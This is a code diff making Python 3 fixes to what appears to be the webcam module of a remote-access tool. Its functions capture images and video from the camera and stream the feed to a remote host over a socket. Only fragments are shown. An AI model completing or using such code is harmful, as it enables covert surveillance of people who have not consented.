@@ -41,12 +41,12 @@ def image(*args, **kwargs):
         img = util.png(f)
         return base64.b64encode(img)
     except Exception as e:
-        return '{} error: {}'.format(image.func_name, str(e))
+        return '{} error: {}'.format(image.__name__, str(e))
 
 def video(*args, **kwargs):
     try:
         fpath = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name == 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
-        fourcc = cv2.VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else cv2.VideoWriter_fourcc(*'XVID')
+        fourcc = cv2.VideoWriter_fourcc(*'DIVX') if os.name == 'nt' else cv2.VideoWriter_fourcc(*'XVID')
         output = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
         length = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
         end = time.time() + length
@@ -63,7 +63,7 @@ def video(*args, **kwargs):
         except: pass
         return result
     except Exception as e:
-        return '{} error: {}'.format(video.func_name, str(e))
+        return '{} error: {}'.format(video.__name__, str(e))
 
 def stream(host=None, port=None, retries=5):
     try:
@@ -92,4 +92,4 @@ def stream(host=None, port=None, retries=5):
             dev.release()
             sock.close()
     except Exception as e:
-        return '{} error: {}'.format(stream.func_name, str(e))
+        return '{} error: {}'.format(stream.__name__, str(e))
